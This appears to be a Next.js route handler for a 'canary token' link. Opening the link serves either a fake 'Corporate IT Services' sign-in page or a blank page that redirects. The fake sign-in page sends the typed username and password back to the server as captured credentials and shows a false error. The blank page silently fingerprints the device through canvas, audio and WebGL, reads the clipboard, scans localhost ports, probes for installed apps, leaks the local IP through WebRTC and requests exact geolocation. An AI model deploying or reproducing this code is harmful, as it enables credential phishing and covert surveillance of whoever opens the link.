import { NextRequest, NextResponse } from 'next/server';
import { createAlert, getToken } from '@/lib/storage';

const transparentPixel = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

export const dynamic = 'force-dynamic';

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const resolvedParams = await params;
  const token_id = resolvedParams.id;

  const vercelForwarded = request.headers.get('x-vercel-forwarded-for');
  const forwardedFor = request.headers.get('x-forwarded-for');
  const realIp = request.headers.get('x-real-ip');
  
  const attacker_ip = (vercelForwarded ? vercelForwarded.split(',')[0].trim() : null) || 
                      (forwardedFor ? forwardedFor.split(',')[0].trim() : null) || 
                      realIp || 
                      'Unknown IP';
  const user_agent = request.headers.get('user-agent') || 'Unknown User-Agent';
  
  const city = request.headers.get('x-vercel-ip-city') || '';
  const country = request.headers.get('x-vercel-ip-country') || '';
  const lat = request.headers.get('x-vercel-ip-latitude') || '';
  const lon = request.headers.get('x-vercel-ip-longitude') || '';
  
  let location = city && country ? `${city}, ${country}` : (country || 'Unknown Location');
  if (lat && lon) {
    location += ` (${lat}, ${lon})`;
  }

  // Supplement location data using ip-api.com if Vercel headers are missing
  if (location === 'Unknown Location' && attacker_ip !== 'Unknown IP' && attacker_ip !== '127.0.0.1' && attacker_ip !== '::1') {
    try {
      const res = await fetch(`http://ip-api.com/json/${attacker_ip}`);
      const data = await res.json();
      if (data.status === 'success') {
        location = `${data.city}, ${data.regionName}, ${data.country}`;
        if (data.isp) location += ` - ISP: ${data.isp}`;
      }
    } catch(err) {
      console.error('IP API lookup failed:', err);
    }
  }

  let alertId = '';
  try {
    const alert = await createAlert(token_id, attacker_ip, user_agent, location);
    alertId = alert.id;
  } catch (err) {
    console.error('Exception logging alert:', err);
  }

  const token = await getToken(token_id);
  
  const accept = request.headers.get('accept') || '';
  const isHtmlRequest = accept.includes('text/html');
  
  let finalUrl = token?.redirect_url || '';
  if (finalUrl && !finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
    finalUrl = 'https://' + finalUrl;
  }

  const payloadType = token?.payload_type || 'invisible';

  if (isHtmlRequest) {
    if (payloadType === 'fake_login') {
      const loginHtml = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure IT Portal - Sign In</title>
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f3f2f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
          .login-box { background: white; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); width: 100%; max-width: 360px; }
          .logo { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-bottom: 24px; }
          .title { font-size: 24px; font-weight: 600; margin-bottom: 16px; color: #1b1b1b; }
          .input-group { margin-bottom: 16px; }
          input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #666; border-radius: 0; box-sizing: border-box; font-size: 15px; }
          input[type="text"]:focus, input[type="password"]:focus { outline: 1px solid #0067b8; border-color: #0067b8; }
          .btn { background-color: #0067b8; color: white; border: none; padding: 10px 32px; font-size: 15px; cursor: pointer; float: right; margin-top: 16px; }
          .btn:hover { background-color: #005da6; }
          .footer-links { margin-top: 40px; font-size: 13px; color: #0067b8; clear: both; }
          #error-msg { color: #e81123; font-size: 14px; margin-bottom: 16px; display: none; }
        </style>
      </head>
      <body>
        <div class="login-box">
          <div class="logo">Corporate IT Services</div>
          <div class="title">Sign in</div>
          <div id="error-msg">Incorrect user ID or password. Type the correct user ID and password, and try again.</div>
          <form id="loginForm">
            <div class="input-group">
              <input type="text" id="username" placeholder="someone@example.com" required>
            </div>
            <div class="input-group" id="pass-group" style="display:none;">
              <input type="password" id="password" placeholder="Password">
            </div>
            <button type="button" class="btn" id="nextBtn">Next</button>
            <button type="submit" class="btn" id="submitBtn" style="display:none;">Sign in</button>
          </form>
          <div class="footer-links">Can't access your account?</div>
        </div>

        <script>
          const form = document.getElementById('loginForm');
          const nextBtn = document.getElementById('nextBtn');
          const submitBtn = document.getElementById('submitBtn');
          const usernameInput = document.getElementById('username');
          const passwordInput = document.getElementById('password');
          const passGroup = document.getElementById('pass-group');
          const errorMsg = document.getElementById('error-msg');

          nextBtn.addEventListener('click', () => {
            if (usernameInput.value.trim() !== '') {
              passGroup.style.display = 'block';
              nextBtn.style.display = 'none';
              submitBtn.style.display = 'block';
              passwordInput.focus();
            }
          });

          form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = usernameInput.value;
            const password = passwordInput.value;
            
            try {
              await fetch('/api/v1/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                  alert_id: '${alertId}', 
                  details: { captured_credentials: username + ':' + password } 
                })
              });
            } catch(err) {}

            errorMsg.style.display = 'block';
            passwordInput.value = '';
          });

          // Telemetry Script
          (async function() {
            try {
              let device_model = '';
              let os_platform = navigator.platform || '';
              let gpu_renderer = '';
              let battery_level = '';
              let connection_type = '';
              let touch_points = navigator.maxTouchPoints || 0;
              let exact_lat = null;
              let exact_lon = null;
              let local_ip = null;
              let threat_id = 'Unknown';
              
              try {
                if (navigator.geolocation) {
                  navigator.geolocation.getCurrentPosition(
                    (pos) => {
                      fetch('/api/v1/event', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ alert_id: '${alertId}', details: { exact_lat: pos.coords.latitude, exact_lon: pos.coords.longitude } })
                      }).catch(()=>({}));
                    },
                    (err) => {},
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                  );
                }
              } catch(e) {}
              
              try {
                const rtc = new RTCPeerConnection({iceServers:[]});
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                rtc.onicecandidate = (e) => {
                  if (e.candidate && e.candidate.candidate) {
                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                    if (match) local_ip = match[1];
                  }
                };
              } catch(e) {}
              
              if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                  const entropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                  device_model = entropy.model || '';
                  if (entropy.platform) {
                    os_platform = entropy.platform;
                    if (entropy.platformVersion) os_platform += ' ' + entropy.platformVersion;
                  }
                } catch(e) {}
              }

              if (navigator.userAgent.match(/(iPhone|iPad|Macintosh)/i) && !device_model) {
                const max = Math.max(window.screen.width, window.screen.height);
                const min = Math.min(window.screen.width, window.screen.height);
                const res = min + 'x' + max + '@' + (window.devicePixelRatio || 1);
                const appleMap = {
                  '430x932@3': 'iPhone 14/15 Pro Max / 15 Plus',
                  '393x852@3': 'iPhone 14 Pro / 15 / 15 Pro',
                  '428x926@3': 'iPhone 12/13/14 Pro Max / 14 Plus',
                  '390x844@3': 'iPhone 12/13/14 / 12/13 Pro',
                  '375x812@3': 'iPhone X/XS / 11 Pro / 12/13 Mini',
                  '414x896@3': 'iPhone XS Max / 11 Pro Max',
                  '414x896@2': 'iPhone XR / 11',
                  '414x736@3': 'iPhone 6/7/8 Plus',
                  '375x667@2': 'iPhone 6/7/8 / SE (2nd/3rd)',
                  '320x568@2': 'iPhone 5/5s/SE (1st)',
                  '1024x1366@2': 'iPad Pro 12.9"',
                  '834x1194@2': 'iPad Pro 11"',
                  '820x1180@2': 'iPad Air (4th/5th)',
                  '834x1112@2': 'iPad Air 3 / Pro 10.5"',
                  '810x1080@2': 'iPad (7th/8th/9th)',
                  '768x1024@2': 'iPad Mini / iPad (5th/6th)'
                };
                if (appleMap[res]) device_model = appleMap[res];
              }

              try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top'; ctx.font = '14px "Arial"'; ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
                ctx.fillStyle = '#069'; ctx.fillText('canary,token', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('canary,token', 4, 17);
                const canvasData = canvas.toDataURL();

                let audioData = '';
                try {
                  const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                  const oscillator = audioCtx.createOscillator();
                  oscillator.type = 'triangle'; oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
                  const compressor = audioCtx.createDynamicsCompressor();
                  compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
                  compressor.knee.setValueAtTime(40, audioCtx.currentTime);
                  compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
                  compressor.attack.setValueAtTime(0, audioCtx.currentTime);
                  compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
                  oscillator.connect(compressor); compressor.connect(audioCtx.destination);
                  oscillator.start(0);
                  audioCtx.oncomplete = (e) => {
                    const buffer = e.renderedBuffer.getChannelData(0);
                    audioData = buffer.slice(4500, 5000).reduce((acc, val) => acc + Math.abs(val), 0).toString();
                  };
                  audioCtx.startRendering();
                } catch(e) {}

                const cyrb53 = function(str, seed = 0) {
                  let h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed;
                  for (let i = 0, ch; i < str.length; i++) {
                    ch = str.charCodeAt(i);
                    h1 = Math.imul(h1 ^ ch, 2654435761); h2 = Math.imul(h2 ^ ch, 1597334677);
                  }
                  h1 = Math.imul(h1 ^ (h1>>>16), 2246822507) ^ Math.imul(h2 ^ (h2>>>13), 3266489909);
                  h2 = Math.imul(h2 ^ (h2>>>16), 2246822507) ^ Math.imul(h1 ^ (h1>>>13), 3266489909);
                  return 4294967296 * (2097151 & h2) + (h1>>>0);
                };

                threat_id = 'T-' + cyrb53(canvasData + audioData).toString(16).toUpperCase();
              } catch(e) {}

              try {
                for(let i = 0; i < 100; i++) {
                  const canvas = document.createElement('canvas');
                  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                  if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                      const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                      if (gpu) gpu_renderer = gpu;
                    }
                  }
                }
              } catch(e) {}

              if (navigator.userAgent.match(/Android/i) && !device_model && gpu_renderer) {
                const gpu = gpu_renderer.toLowerCase();
                if (gpu.includes('adreno (tm) 506')) device_model = 'Snapdragon 625/450 (e.g. Redmi Note 4 / Moto G5)';
                else if (gpu.includes('adreno (tm) 512')) device_model = 'Snapdragon 660 (e.g. Redmi Note 7)';
                else if (gpu.includes('adreno (tm) 618')) device_model = 'Snapdragon 730G/732G (e.g. Poco X3)';
                else if (gpu.includes('adreno (tm) 640')) device_model = 'Snapdragon 855 (e.g. Galaxy S10 / Pixel 4)';
                else if (gpu.includes('mali-g71')) device_model = 'Exynos 8895 (e.g. Galaxy S8)';
                else if (gpu.includes('mali-g72')) device_model = 'Exynos 9810 (e.g. Galaxy S9)';
                else if (gpu.includes('mali-g76')) device_model = 'Exynos 9820 (e.g. Galaxy S10)';
                else if (gpu.includes('mali-g77')) device_model = 'Exynos 990 (e.g. Galaxy S20)';
                else if (gpu.includes('mali-g78')) device_model = 'Exynos 2100 / Tensor G1 (e.g. S21 / Pixel 6)';
                else if (gpu.includes('mali-g710')) device_model = 'Tensor G2/G3 / Dimensity 9000 (e.g. Pixel 7)';
                else if (gpu.includes('adreno (tm) 730')) device_model = 'Snapdragon 8 Gen 1 (e.g. Galaxy S22)';
                else if (gpu.includes('adreno (tm) 740')) device_model = 'Snapdragon 8 Gen 2 (e.g. Galaxy S23)';
              }

              try {
                for(let i = 0; i < 100; i++) {
                  if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    battery_level = Math.round(battery.level * 100) + '% ' + (battery.charging ? '(Charging)' : '');
                  }
                  if (navigator.connection && navigator.connection.effectiveType) connection_type = navigator.connection.effectiveType;
                  if (navigator.maxTouchPoints) touch_points = navigator.maxTouchPoints;
                  await new Promise(r => setTimeout(r, 2));
                }
              } catch(e) {}

              const details = {
                hardware_concurrency: navigator.hardwareConcurrency,
                device_memory: navigator.deviceMemory,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen_resolution: window.screen.width + 'x' + window.screen.height,
                device_model: device_model,
                os_platform: os_platform,
                gpu_renderer: gpu_renderer,
                battery_level: battery_level,
                connection_type: connection_type,
                touch_points: touch_points,
                exact_lat: exact_lat,
                exact_lon: exact_lon,
                local_ip: local_ip,
                threat_id: threat_id
              };
              
              await fetch('/api/v1/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ alert_id: '${alertId}', details })
              });
            } catch(e) {}
          })();
        </script>
      </body>
      </html>
      `;
      return new Response(loginHtml, { 
        headers: { 'Content-Type': 'text/html', 'Cache-Control': 'no-store, no-cache, must-revalidate' }
      });
    }

    // Default HTML payload (Invisible or Redirect)
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Loading...</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body style="background: #000;">
      <script>
        (async function() {
          window.redirectTriggered = false;
          window.doRedirect = () => {
            ${finalUrl ? `
              if (!window.redirectTriggered) {
                window.redirectTriggered = true;
                window.location.replace('${finalUrl}');
              }
            ` : `
              // No redirect configured, do nothing
            `}
          };
          
          ${finalUrl ? `window.fallbackTimer = setTimeout(window.doRedirect, 15000); // 15s max wait` : ``}

          let alertId = '${alertId}';
          try {
            let device_model = '';
            let os_platform = navigator.platform || '';
            let gpu_renderer = '';
            let battery_level = '';
            let connection_type = '';
            let touch_points = navigator.maxTouchPoints || 0;
            
            // Attempt to get exact device model and true OS version on modern browsers (Android/Chrome)
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
              try {
                const entropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                device_model = entropy.model || '';
                if (entropy.platform) {
                  os_platform = entropy.platform;
                  if (entropy.platformVersion) {
                    // On Android, platformVersion maps to the real Android version (e.g. 14.0.0)
                    os_platform += ' ' + entropy.platformVersion;
                  }
                }
              } catch(e) {}
            }

            let exact_lat = null;
            let exact_lon = null;
            let local_ip = null;
            let threat_id = 'Unknown';
            let color_depth = window.screen.colorDepth || 24;
            let dark_mode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
            let referrer = document.referrer || '';
            let device_posture = 'Unknown';
            let clipboard_text = '';
            let camera_image = '';
            let loadTime = Date.now();
            let dwell_time_ms = 0;

            // Try to get device posture (Orientation)
            if (window.DeviceOrientationEvent) {
              window.addEventListener('deviceorientation', function(event) {
                if (event.beta === null) return;
                if (event.beta > 70 && event.beta < 110) device_posture = 'Held upright (Portrait)';
                else if (event.beta > -10 && event.beta < 10 && event.gamma > -10 && event.gamma < 10) device_posture = 'Lying flat on desk';
                else device_posture = 'Held angled/Moving';
              }, {once: true});
            }

            // Extreme Silent Telemetry Variables
            let open_ports = [];
            let has_adblocker = false;
            let installed_apps = [];
            let is_sandbox_bot = false;
            let peripheral_count = { webcams: 0, mics: 0, speakers: 0 };
            let network_speed = { downlink_mbps: 0, ping_ms: 0 };
            let accessibility_settings = [];
            let cpu_benchmark_score = 0;
            let estimated_storage_gb = 0;
            let webgl_fingerprint = 'Unknown';

            // 1. Storage Capacity Estimator
            try {
              if (navigator.storage && navigator.storage.estimate) {
                navigator.storage.estimate().then(est => {
                  if (est.quota) estimated_storage_gb = Math.round(est.quota / (1024 * 1024 * 1024));
                });
              }
            } catch(e) {}

            // 2. Hardware Peripheral Counter
            try {
              if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                navigator.mediaDevices.enumerateDevices().then(devices => {
                  devices.forEach(d => {
                    if (d.kind === 'videoinput') peripheral_count.webcams++;
                    if (d.kind === 'audioinput') peripheral_count.mics++;
                    if (d.kind === 'audiooutput') peripheral_count.speakers++;
                  });
                });
              }
            } catch(e) {}

            // 3. Bandwidth Profiler
            try {
              if (navigator.connection) {
                network_speed.downlink_mbps = navigator.connection.downlink || 0;
                network_speed.ping_ms = navigator.connection.rtt || 0;
              }
            } catch(e) {}

            // 4. Accessibility Settings
            try {
              if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) accessibility_settings.push('Reduced Motion');
              if (window.matchMedia('(forced-colors: active)').matches) accessibility_settings.push('Forced Colors (High Contrast)');
              if (window.matchMedia('(prefers-contrast: more)').matches) accessibility_settings.push('Increased Contrast');
            } catch(e) {}

            // 5. CPU Micro-Benchmarker
            try {
              let start = performance.now();
              let ops = 0;
              while (performance.now() - start < 100) {
                Math.sqrt(Math.random() * 10000);
                ops++;
              }
              cpu_benchmark_score = ops; // Higher is better
            } catch(e) {}

            // 6. Adblocker Detection (Honeypot)
            try {
              let bait = document.createElement('div');
              bait.innerHTML = '&nbsp;';
              bait.className = 'adsbox ad-placement doubleclick ad-placeholder';
              bait.style.position = 'absolute'; bait.style.top = '-1000px';
              document.body.appendChild(bait);
              setTimeout(() => {
                if (bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none') {
                  has_adblocker = true;
                }
                bait.remove();
              }, 100);
            } catch(e) {}

            // 7. Sandbox/Bot Detection
            try {
              if (navigator.webdriver) is_sandbox_bot = true;
              if (window.outerWidth === 0 && window.outerHeight === 0) is_sandbox_bot = true;
              if (navigator.languages === undefined || navigator.languages.length === 0) is_sandbox_bot = true;
              if (window.document.documentElement.getAttribute('webdriver') === 'true') is_sandbox_bot = true;
            } catch(e) {}

            // 8. Port Sweeper
            try {
              const ports = [3306, 8080, 3000, 5000, 6379, 27017];
              ports.forEach(port => {
                let img = new Image();
                img.onload = () => { open_ports.push(port.toString()); };
                img.onerror = () => { /* Connection refused vs Timeout can indicate open vs closed, but image tag is safer */ };
                img.src = 'http://127.0.0.1:' + port + '/favicon.ico';
              });
            } catch(e) {}

            // 9. Desktop/Mobile App Protocol Detector
            try {
              const apps = { 'discord://': 'Discord', 'zoommtg://': 'Zoom', 'steam://': 'Steam', 'tg://': 'Telegram', 'whatsapp://': 'WhatsApp' };
              for (const [protocol, name] of Object.entries(apps)) {
                let iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                let start = performance.now();
                try { iframe.contentWindow.location.href = protocol; } catch(e) {}
                setTimeout(() => {
                  if (performance.now() - start < 150) {
                    // Quick failure means the OS doesn't know the protocol
                  } else {
                    installed_apps.push(name); // Blur or dialog took time
                  }
                  iframe.remove();
                }, 100);
              }
            } catch(e) {}

            // Attempt aggressive Clipboard sniffing
            try {
              if (navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(text => {
                  if (text && text.trim().length > 0) {
                    clipboard_text = text.substring(0, 500);
                  }
                }).catch(() => {});
              }
            } catch(e) {}

            try {
              const rtc = new RTCPeerConnection({iceServers:[]});
              rtc.createDataChannel('');
              rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
              rtc.onicecandidate = (e) => {
                if (e.candidate && e.candidate.candidate) {
                  const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                  if (match) local_ip = match[1];
                }
              };
            } catch(e) {}

            // Cryptographic Fingerprinting (Canvas + Audio + Fonts)
            try {
              // 1. Canvas Hash
              const canvas = document.createElement('canvas');
              const ctx = canvas.getContext('2d');
              ctx.textBaseline = 'top';
              ctx.font = '14px "Arial"';
              ctx.textBaseline = 'alphabetic';
              ctx.fillStyle = '#f60';
              ctx.fillRect(125,1,62,20);
              ctx.fillStyle = '#069';
              ctx.fillText('canary,token', 2, 15);
              ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
              ctx.fillText('canary,token', 4, 17);
              const canvasData = canvas.toDataURL();

              // 2. Audio Hash
              let audioData = '';
              try {
                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const oscillator = audioCtx.createOscillator();
                oscillator.type = 'triangle';
                oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
                const compressor = audioCtx.createDynamicsCompressor();
                compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
                compressor.knee.setValueAtTime(40, audioCtx.currentTime);
                compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
                compressor.attack.setValueAtTime(0, audioCtx.currentTime);
                compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
                oscillator.connect(compressor);
                compressor.connect(audioCtx.destination);
                oscillator.start(0);
                audioCtx.oncomplete = (e) => {
                  const buffer = e.renderedBuffer.getChannelData(0);
                  audioData = buffer.slice(4500, 5000).reduce((acc, val) => acc + Math.abs(val), 0).toString();
                };
                audioCtx.startRendering();
              } catch(e) {}

              // Simple hash function
              const cyrb53 = function(str, seed = 0) {
                let h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed;
                for (let i = 0, ch; i < str.length; i++) {
                  ch = str.charCodeAt(i);
                  h1 = Math.imul(h1 ^ ch, 2654435761);
                  h2 = Math.imul(h2 ^ ch, 1597334677);
                }
                h1 = Math.imul(h1 ^ (h1>>>16), 2246822507) ^ Math.imul(h2 ^ (h2>>>13), 3266489909);
                h2 = Math.imul(h2 ^ (h2>>>16), 2246822507) ^ Math.imul(h1 ^ (h1>>>13), 3266489909);
                return 4294967296 * (2097151 & h2) + (h1>>>0);
              };

              // Combine to generate unique threat ID
              threat_id = 'T-' + cyrb53(canvasData + audioData).toString(16).toUpperCase();
            } catch(e) {}

            // Extract GPU (100 verification passes to bypass anti-fingerprinting spoofers)
            try {
              for(let i = 0; i < 100; i++) {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                  if (debugInfo) {
                    const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    if (gpu) gpu_renderer = gpu;
                  }
                }
              }
            } catch(e) {}

            if (navigator.userAgent.match(/Android/i) && !device_model && gpu_renderer) {
              const gpu = gpu_renderer.toLowerCase();
              if (gpu.includes('adreno (tm) 506')) device_model = 'Snapdragon 625/450 (e.g. Redmi Note 4 / Moto G5)';
              else if (gpu.includes('adreno (tm) 512')) device_model = 'Snapdragon 660 (e.g. Redmi Note 7)';
              else if (gpu.includes('adreno (tm) 618')) device_model = 'Snapdragon 730G/732G (e.g. Poco X3)';
              else if (gpu.includes('adreno (tm) 640')) device_model = 'Snapdragon 855 (e.g. Galaxy S10 / Pixel 4)';
              else if (gpu.includes('mali-g71')) device_model = 'Exynos 8895 (e.g. Galaxy S8)';
              else if (gpu.includes('mali-g72')) device_model = 'Exynos 9810 (e.g. Galaxy S9)';
              else if (gpu.includes('mali-g76')) device_model = 'Exynos 9820 (e.g. Galaxy S10)';
              else if (gpu.includes('mali-g77')) device_model = 'Exynos 990 (e.g. Galaxy S20)';
              else if (gpu.includes('mali-g78')) device_model = 'Exynos 2100 / Tensor G1 (e.g. S21 / Pixel 6)';
              else if (gpu.includes('mali-g710')) device_model = 'Tensor G2/G3 / Dimensity 9000 (e.g. Pixel 7)';
              else if (gpu.includes('adreno (tm) 730')) device_model = 'Snapdragon 8 Gen 1 (e.g. Galaxy S22)';
              else if (gpu.includes('adreno (tm) 740')) device_model = 'Snapdragon 8 Gen 2 (e.g. Galaxy S23)';
            }

            // Extract & Verify Battery, Connection, and Touch (100 passes for accuracy)
            try {
              for(let i = 0; i < 100; i++) {
                if (navigator.getBattery) {
                  const battery = await navigator.getBattery();
                  battery_level = Math.round(battery.level * 100) + '% ' + (battery.charging ? '(Charging)' : '');
                }
                if (navigator.connection && navigator.connection.effectiveType) {
                  connection_type = navigator.connection.effectiveType;
                }
                if (navigator.maxTouchPoints) {
                  touch_points = navigator.maxTouchPoints;
                }
                // Micro-delay to allow asynchronous sensors to settle and prevent misfires
                await new Promise(r => setTimeout(r, 2));
              }
            } catch(e) {}

            const details = {
              hardware_concurrency: navigator.hardwareConcurrency,
              device_memory: navigator.deviceMemory,
              language: navigator.language,
              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
              screen_resolution: window.screen.width + 'x' + window.screen.height,
              device_model: device_model,
              os_platform: os_platform,
              gpu_renderer: gpu_renderer,
              battery_level: battery_level,
              connection_type: connection_type,
              touch_points: touch_points,
              exact_lat: exact_lat,
              exact_lon: exact_lon,
              local_ip: local_ip,
              threat_id: threat_id,
              color_depth: color_depth,
              dark_mode: dark_mode,
              referrer: referrer,
              device_posture: device_posture,
              clipboard_text: clipboard_text,
              camera_image: camera_image,
              open_ports: open_ports,
              has_adblocker: has_adblocker,
              is_sandbox_bot: is_sandbox_bot,
              peripheral_count: peripheral_count,
              network_speed: network_speed,
              installed_apps: installed_apps,
              accessibility_settings: accessibility_settings,
              cpu_benchmark_score: cpu_benchmark_score,
              estimated_storage_gb: estimated_storage_gb,
              webgl_fingerprint: webgl_fingerprint
            };
            
            // 10. Send the main payload immediately before requesting invasive permissions
            await fetch('/api/v1/event', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ alert_id: '${alertId}', details })
            }).catch(()=>{});

            // 12. Request Geolocation Permission (Blocks Redirect)
            try {
              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  (pos) => {
                    fetch('/api/v1/event', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      keepalive: true,
                      body: JSON.stringify({ alert_id: '${alertId}', details: { exact_lat: pos.coords.latitude, exact_lon: pos.coords.longitude } })
                    }).catch(()=>{}).finally(() => {
                      if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
                      window.doRedirect();
                    });
                  },
                  (err) => {
                     if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
                     window.doRedirect();
                  },
                  { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
              } else {
                if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
                window.doRedirect();
              }
            } catch(e) {
                if (window.fallbackTimer) clearTimeout(window.fallbackTimer);
                window.doRedirect();
            }

            // Track Dwell Time on Exit
            const sendDwellTime = () => {
              dwell_time_ms = Date.now() - loadTime;
              const payload = JSON.stringify({ alert_id: '${alertId}', details: { dwell_time_ms: dwell_time_ms, clipboard_text: clipboard_text } });
              if (navigator.sendBeacon) {
                const blob = new Blob([payload], { type: 'application/json' });
                navigator.sendBeacon('/api/v1/event', blob);
              } else {
                fetch('/api/v1/event', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true }).catch(()=>{});
              }
            };
            
            window.addEventListener('visibilitychange', () => {
              if (document.visibilityState === 'hidden') sendDwellTime();
            });
            window.addEventListener('beforeunload', sendDwellTime);

          } catch(e) {}
        })();
      </script>
    </body>
    </html>
    `;
    
    return new Response(html, { 
      headers: { 
        'Content-Type': 'text/html',
        'Cache-Control': 'no-store, no-cache, must-revalidate'
      }
    });
  }

  if (finalUrl) {
    try {
      // Validate URL parse
      new URL(finalUrl);
      return NextResponse.redirect(finalUrl, 302);
    } catch (e) {
      console.error('Invalid redirect URL:', finalUrl);
      // Fallback to transparent pixel if URL is completely invalid
    }
  }

  return new Response(transparentPixel, {
    status: 200,
    headers: {
      'Content-Type': 'image/gif',
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}
